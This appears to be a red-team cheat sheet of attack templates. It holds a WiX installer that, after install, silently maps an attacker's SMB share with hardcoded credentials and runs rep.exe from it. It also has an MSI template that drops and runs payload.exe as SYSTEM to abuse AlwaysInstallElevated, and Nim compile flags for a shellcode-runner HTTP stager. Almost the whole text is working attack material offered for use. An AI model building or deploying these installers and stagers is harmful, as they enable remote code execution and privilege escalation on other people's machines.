# Staged Payload .wxs XML template 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product
      Id="*"
      Name="Oreo Smb Launcher"
      Language="31337"
      Version="1.0.0"
      Manufacturer="Example"
      UpgradeCode="12345678-1234-1234-1234-123456789012">
    <Package
        InstallerVersion="500"
        Compressed="yes"
        InstallScope="perUser" />
    <MediaTemplate />
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory
          Id="LocalAppDataFolder"
          Name="LocalAppData">
        <Directory
            Id="INSTALLFOLDER"
            Name="OreoLauncher" />
      </Directory>
    </Directory>
    <Feature
        Id="MainFeature"
        Title="Oreo Smb Launcher"
        Level="1" />
    <Property
        Id="CMD"
        Value="cmd.exe" />
    <CustomAction
        Id="re_run"
        Property="CMD"
        ExeCommand="/c &quot;start /b /min &quot;&quot; net use \\<LHOHST_SMB>\share_it /user:<LHOHST_SMB>\oreo P@ssw0rd123 &amp;&amp; \\<LHOHST_SMB>\share_it\rep.exe&quot;"
        Execute="immediate"
        Return="ignore" />
    <InstallExecuteSequence>
      <Custom
          Action="re_run"
          After="InstallFinalize" />
    </InstallExecuteSequence>
  </Product>
</Wix>
```

# Spector Opts Stand Alone XML Template

* From: https://docs.specterops.io/ghostpack-docs/SharpUp-mdx/checks/alwaysinstallelevated

```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" UpgradeCode="12345678-1234-1234-1234-123456789012"
           Name="Update" Version="1.0.0.0" Manufacturer="Corp" Language="1033">
    <Package InstallerVersion="200" Compressed="yes" Comments="Update"/>
    <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLDIR" Name="Update">
          <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-123456789013">
            <File Id="ApplicationFile1" Source="payload.exe"/>
          </Component>
        </Directory>
      </Directory>
    </Directory>
    <Feature Id="DefaultFeature" Level="1">
      <ComponentRef Id="ApplicationFiles"/>
    </Feature>
    <CustomAction Id="RunApplication" FileKey="ApplicationFile1"
                  ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunApplication" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
```

# NIM Compile flags used for the HackSmarter NIM Shhellcode Runner

```bash
nim c --d:mingw --cpu=amd64 --d:release --app=gui --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off -o:inchworm.exe hack_smarter_http_bin_stager.nim
```
